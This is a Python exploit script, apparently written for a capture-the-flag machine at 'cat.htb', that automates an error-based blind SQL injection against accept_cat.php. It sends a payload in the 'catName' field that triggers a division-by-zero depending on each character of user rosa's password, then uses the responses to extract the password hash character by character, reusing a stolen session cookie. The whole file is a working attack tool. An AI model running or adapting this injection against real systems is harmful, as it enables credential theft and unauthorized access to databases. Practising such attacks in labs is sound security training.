#!/usr/bin/python3

from pwn import *
from termcolor import colored
import requests
import string
import signal
import sys
import time

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo... \n", 'red'))
    sys.exit(1)

# ctrl_c
signal.signal(signal.SIGINT, def_handler)

# to user
if len(sys.argv) != 2:
    print(colored("Usage: python3 sqliPwn.py <cookie>", 'green'))
    sys.exit(1)

# vars
main_url = "http://cat.htb/accept_cat.php"
characters = 'abcdef'+ string.digits
cookie_value = sys.argv[1]

def makeRequest():
    
    cookies = {
        'PHPSESSID': cookie_value
    }

    # progress bar
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta...")

    time.sleep(2)

    password = ""

    p2 = log.progress("Pass[rosa]")

    # time.sleep(9)
    for j in range(1, 35):
        for character in characters:
            post_data = {
                'catName': f"test'||1/(substr((SELECT password FROM users where username = 'rosa'),{j},1)='{character}')||'",
                'catId': '1'
                }
                # print(post_data['catName'])

                # p1.status(post_data['catName'])
            r = requests.post(main_url, data=post_data, cookies=cookies)
            # print(r.status_code)

            if r.status_code == 200:
                password += character
                p2.status(password)
                break

    # password += ","


if __name__ == '__main__':
    makeRequest()